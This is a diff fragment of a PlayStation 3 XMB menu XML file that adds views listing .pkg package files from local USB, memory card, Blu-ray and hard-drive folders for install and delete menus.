+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1_dl" src="host://localhost/q?path=/dev_usb001/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_pkg1" src="host://localhost/q?path=/dev_usb002/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_pkg2" src="host://localhost/q?path=/dev_usb002/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2_dl" src="host://localhost/q?path=/dev_usb002/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_pkg1" src="host://localhost/q?path=/dev_usb003/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_pkg2" src="host://localhost/q?path=/dev_usb003/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3_dl" src="host://localhost/q?path=/dev_usb003/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_pkg1" src="host://localhost/q?path=/dev_usb004/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_pkg2" src="host://localhost/q?path=/dev_usb004/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4_dl" src="host://localhost/q?path=/dev_usb004/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_pkg1" src="host://localhost/q?path=/dev_usb005/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_pkg2" src="host://localhost/q?path=/dev_usb005/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5_dl" src="host://localhost/q?path=/dev_usb005/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_pkg1" src="host://localhost/q?path=/dev_usb006/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_pkg2" src="host://localhost/q?path=/dev_usb006/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6_dl" src="host://localhost/q?path=/dev_usb006/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_pkg1" src="host://localhost/q?path=/dev_usb007/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_pkg2" src="host://localhost/q?path=/dev_usb007/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7_dl" src="host://localhost/q?path=/dev_usb007/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms" 	src="host://localhost/q?path=/dev_ms&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_pkg1" 	src="host://localhost/q?path=/dev_ms/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_pkg2" src="host://localhost/q?path=/dev_ms/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms_dl" src="host://localhost/q?path=/dev_ms/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd" 	src="host://localhost/q?path=/dev_sd&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_pkg1" 	src="host://localhost/q?path=/dev_sd/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_pkg2" src="host://localhost/q?path=/dev_sd/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_sd_dl" src="host://localhost/q?path=/dev_sd/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf" 	src="host://localhost/q?path=/dev_cf&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_pkg1" 	src="host://localhost/q?path=/dev_cf/packages&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_pkg2" src="host://localhost/q?path=/dev_cf/PKG&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_cf_dl" src="host://localhost/q?path=/dev_cf/PS3/DOWNLOADS&suffix=.pkg"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_hdd0" src="host://localhost/q?path=/dev_hdd0/tmp/np_pkg&suffix=.pkg" />
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
+		</Items>
+	</View>	
+		
+	<View id="seg_delete_files_hdd0_path">
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="host_provider_hdd0" attr="host_provider_hdd0" src="host://localhost/q?path=/dev_hdd0/packages&suffix=.pkg"/>		  
+		</Items></View>
+
+	<View id="seg_delete_usb_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/packages/&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd/packages&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg" />
+		</Items></View>
+		
+	<View id="seg_delete_files_og_path">
+		<Items>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg" />
+		</Items></View>
+
+</XMBML>
